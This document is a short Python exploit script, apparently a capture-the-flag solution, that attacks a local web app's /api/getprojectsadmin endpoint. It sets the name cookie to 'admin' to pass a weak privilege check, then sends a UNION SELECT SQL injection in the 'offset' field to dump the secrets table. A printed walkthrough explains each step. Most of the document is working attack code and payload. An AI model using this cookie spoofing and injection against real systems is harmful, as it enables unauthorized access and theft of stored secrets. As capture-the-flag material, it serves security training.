import requests
from loggedin import login
host = "localhost:5000"

print("""
First of all, the /api/getprojectsadmin function checks the name in the cookie instead of the usertype from db.
We do need a valid token (just log in), but anything else can be spoofed.

The function then allows for a simple SQL injection not present in the Java Version.

From the init_db function we know that the table we're interested in would be SELECT secret FROM secrets.
We can easily use a UNION statement to return contents of the intresting secrets table.

The only problem:
    sqlite3.OperationalError: SELECTs to the left and right of UNION do not have the same number of result columns

We overcom this by simply returning the same row over and over again:
    1' UNION SELECT secret, secret, secret, secret, secret, secret, secret, secret FROM secrets WHERE '1'=='1

Even better: since 'secret' is not empty, the db system also expects the "secret" at position x[3].
This indicates to the jsonize_projects function that the row in question is a "public project" and shuld therefore be retruned.
Luckily this non-empty String is not falsey, the SQLi "just works".

Finally we
    resp = requests.post("http://{}/api/getprojectsadmin".format(host), cookies=cookies, json=payload)
   
And get back the Flag:
""")


# first, login with any user, see loggedin.py
logged_in = login()

cookies = logged_in.cookies

# we set the name
del cookies["name"]
cookies["name"] = "admin"

payload = {
 "sorting": "oldest",
 "offset": "1' UNION SELECT secret, secret, secret, secret, secret, secret, secret, secret FROM secrets WHERE '1'=='1"
}

resp = requests.post("http://{}/api/getprojectsadmin".format(host), cookies=cookies, json=payload)
print(resp.json()[0]["code"])  # It's in the first element.
